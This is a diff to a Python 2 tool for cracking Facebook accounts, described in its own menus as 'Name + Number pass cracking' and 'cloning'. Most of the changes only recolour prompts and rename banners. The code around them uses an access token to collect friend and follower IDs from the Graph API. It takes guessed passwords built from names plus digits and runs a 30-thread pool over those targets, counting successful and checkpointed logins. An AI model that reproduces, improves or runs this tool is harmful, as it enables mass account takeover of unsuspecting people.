@@ -947,12 +947,12 @@ def crack_b():
 
     os.system('clear')
     print logo
-    print '\x1b[1;93m~~~~ Name + Number pass cracking ~~~~\x1b[1;91m'
+    print '\033[1;97m~~~~ Name + Number pass cracking ~~~~\033[1;91m'
     print 47 * '-'
-    print '\x1b[1;92m[1] Public id cloning'
-    print '\x1b[1;92m[2] Followers cloning'
-    print '\x1b[1;92m[3] File cloning'
-    print '\x1b[1;92m[0] Back'
+    print '\033[1;96m[1] Public id cloning'
+    print '\033[1;96m[2] Followers cloning'
+    print '\033[1;96m[3] File cloning'
+    print '\033[1;96m[0] Back'
     a_s()
 
 
@@ -963,19 +963,19 @@ def name_crack():
     except (KeyError, IOError):
         os.system('clear')
         print logo
-        print '\t Login FB id to continue\x1b[0;97m'
+        print '\t Login FB id to continue\033[0;97m'
         print ''
         time.sleep(1)
         log_menu()
 
     os.system('clear')
     print logo
-    print '\x1b[1;93m~~~~ Name + Number pass cracking ~~~~\x1b[1;91m'
+    print '\033[1;97m~~~~ Name + Number pass cracking ~~~~\033[1;91m'
     print 47 * '-'
-    print '\x1b[1;92m[1] Public id cloning'
-    print '\x1b[1;92m[2] Followers cloning'
-    print '\x1b[1;92m[3] File cloning'
-    print '\x1b[1;92m[B] Back'
+    print '\033[1;96m[1] Public id cloning'
+    print '\033[1;96m[2] Followers cloning'
+    print '\033[1;96m[3] File cloning'
+    print '\033[1;96m[B] Back'
     n_s()
 
 
@@ -983,34 +983,34 @@ def n_s():
     id = []
     cps = []
     oks = []
-    a_s = raw_input(' \x1b[1;97m\xe2\x95\xb0\xe2\x94\x80jutt\xe2\x9e\xa4 ')
+    a_s = raw_input(' \033[1;97m>>>Select ')
     if a_s == '1':
         os.system('clear')
         print logo
-        print '\x1b[1;93m~~~~ Name + Number pass public cracking ~~~~\x1b[1;91m'
+        print '\033[1;97m~~~~ Name + Number pass public cracking ~~~~\033[1;91m'
         print 47 * '-'
-        print '\x1b[1;93mFor example:123,1234,12345,786,12,1122\x1b[1;91m'
+        print '\033[1;97mFor example:123,1234,12345,786,12,1122\033[1;91m'
         print 47 * '-'
-        p1 = raw_input(' \x1b[1;92m[1]Name + digit: ')
-        p2 = raw_input(' \x1b[1;92m[2]Name + digit: ')
-        p3 = raw_input(' \x1b[1;92m[3]Name + digit: ')
-        p4 = raw_input(' \x1b[1;92m[4]Name + digit: ')
-        pass5 = raw_input(' \x1b[1;92m[5]Password: ')
-        pass6 = raw_input(' \x1b[1;92m[6]Password: ')
-        pass7 = raw_input(' \x1b[1;92m[7]Password: ')
-        pass8 = raw_input(' \x1b[1;92m[8]Password: ')
-        idt = raw_input(' \x1b[1;93m[\xe2\x98\x85]Enter id: ')
+        p1 = raw_input(' \033[1;96m[1]Name + digit: ')
+        p2 = raw_input(' \033[1;96m[2]Name + digit: ')
+        p3 = raw_input(' \033[1;96m[3]Name + digit: ')
+        p4 = raw_input(' \033[1;96m[4]Name + digit: ')
+        pass5 = raw_input(' \033[1;96m[5]Password: ')
+        pass6 = raw_input(' \033[1;96m[6]Password: ')
+        pass7 = raw_input(' \033[1;96m[7]Password: ')
+        pass8 = raw_input(' \033[1;96m[8]Password: ')
+        idt = raw_input(' \033[1;97m>>>Enter id: ')
         try:
             r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
             q = json.loads(r.text)
             z = q['name']
             os.system('clear')
             print logo
-            print '\x1b[1;93m~~~~Name pass public cracking~~~~'
-            print ' \x1b[1;92mCloning from: ' + z
+            print '\033[1;97m~~~~Name pass public cracking~~~~'
+            print ' \033[1;96mCloning from: ' + z
         except (KeyError, IOError):
-            print '\t Invalid user \x1b[0;97m'
-            raw_input(' \x1b[1;92mPress enter to try again ')
+            print '\t Invalid user \033[0;97m'
+            raw_input(' \033[1;93mPress enter to try again ')
             name_crack()
 
         r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)
@@ -1024,26 +1024,26 @@ def n_s():
     elif a_s == '2':
         os.system('clear')
         print logo
-        print '\x1b[1;93m~~~~ Name pass followers cracking ~~~~\x1b[1;91m'
+        print '\033[1;97m~~~~ Name pass followers cracking ~~~~\033[1;91m'
         print 47 * '-'
-        print ' \x1b[1;93mFor example:123,1234,12345,786,12,1122\x1b[1;91m'
+        print ' \033[1;97mFor example:123,1234,12345,786,12,1122\033[1;91m'
         print 47 * '-'
-        p1 = raw_input(' \x1b[1;92m[1]Name + digit: ')
-        p2 = raw_input(' \x1b[1;92m[2]Name + digit: ')
-        p3 = raw_input(' \x1b[1;92m[3]Name + digit: ')
-        p4 = raw_input(' \x1b[1;92m[4]Name + digit: ')
-        idt = raw_input(' \x1b[1;93m[\xe2\x98\x85]Enter id: ')
+        p1 = raw_input(' \033[1;96m[1]Name + digit: ')
+        p2 = raw_input(' \033[1;96m[2]Name + digit: ')
+        p3 = raw_input(' \033[1;96m[3]Name + digit: ')
+        p4 = raw_input(' \033[1;96m[4]Name + digit: ')
+        idt = raw_input(' \033[1;97m>>>Enter id: ')
         try:
             r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
             q = json.loads(r.text)
             z = q['name']
             os.system('clear')
             print logo
-            print '\x1b[1;93m~~~~ Name pass followers cracking ~~~~'
-            print ' \x1b[1;92mCloning from: ' + z
+            print '\033[1;97m~~~~ Name pass followers cracking ~~~~'
+            print ' \033[1;96mCloning from: ' + z
         except (KeyError, IOError):
-            print '\t Invalid user \x1b[0;97m'
-            raw_input('\x1b[1;92mPress enter to try again ')
+            print '\t Invalid user \033[0;97m'
+            raw_input('\033[1;93mPress enter to try again ')
             auto_crack()
 
         r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?access_token=' + token + '&limit=999999')
@@ -1057,18 +1057,18 @@ def n_s():
     elif a_s == '3':
         os.system('clear')
         print logo
-        print '\x1b[1;93m~~~~ Name + Number pass File cracking ~~~~\x1b[1;91m'
+        print '\033[1;97m~~~~ Name + Number pass File cracking ~~~~\033[1;91m'
         print 47 * '-'
-        print '\x1b[1;93mFor example:123,1234,12345,786,12,1122\x1b[1;91m'
+        print '\033[1;97mFor example:123,1234,12345,786,12,1122\033[1;91m'
         print 47 * '-'
-        p1 = raw_input(' \x1b[1;92m[1]Name + digit: ')
-        p2 = raw_input(' \x1b[1;92m[2]Name + digit: ')
-        p3 = raw_input(' \x1b[1;92m[3]Name + digit: ')
-        p4 = raw_input(' \x1b[1;92m[4]Name + digit: ')
-        pass5 = raw_input(' \x1b[1;92m[5]Password: ')
-        pass6 = raw_input(' \x1b[1;92m[6]Password: ')
-        pass7 = raw_input(' \x1b[1;92m[7]Password: ')
-        pass8 = raw_input(' \x1b[1;92m[8]Password: ')
+        p1 = raw_input(' \033[1;96m[1]Name + digit: ')
+        p2 = raw_input(' \033[1;96m[2]Name + digit: ')
+        p3 = raw_input(' \033[1;96m[3]Name + digit: ')
+        p4 = raw_input(' \033[1;96m[4]Name + digit: ')
+        pass5 = raw_input(' \033[1;96m[5]Password: ')
+        pass6 = raw_input(' \033[1;96m[6]Password: ')
+        pass7 = raw_input(' \033[1;96m[7]Password: ')
+        pass8 = raw_input(' \033[1;96m[8]Password: ')
         try:
             idlist = raw_input('[+] File Name: ')
             for line in open(idlist, 'r').readlines():
@@ -1087,10 +1087,10 @@ def n_s():
         a_s()
     print ' Total ids: ' + str(len(id))
     time.sleep(0.5)
-    print ' \x1b[1;97mCrack Running\x1b[1;91m '
+    print ' \033[1;97mJutt Badshah Start Cloning\033[1;91m '
     time.sleep(0.5)
     print 47 * '-'
-    print '\t\x1b[1;94mJutt King Of Facebook\x1b[1;91m'
+    print '\033[1;96mJutt Badshah King Of Facebook\033[1;91m'
     print 47 * '-'
 
     def main(arg):
@@ -1226,11 +1226,11 @@ def n_s():
     p = ThreadPool(30)
     p.map(main, id)
     print 47 * '-'
-    print ' \x1b[1;92mCrack Done'
-    print ' \x1b[1;92mTotal Ok/Cp:' + str(len(oks)) + '/' + str(len(cps))
+    print ' \033[1;92mProccess Complete'
+    print ' \033[1;92mTotal Ok/Cp:' + str(len(oks)) + '/' + str(len(cps))
     print 47 * '-'
-    raw_input(' \x1b[1;93mPress enter to back')
-    auto_crack()
+    raw_input(' \x1b[1;97mPress enter to back')
+    name_crack()
 
 
 if __name__ == '__main__':
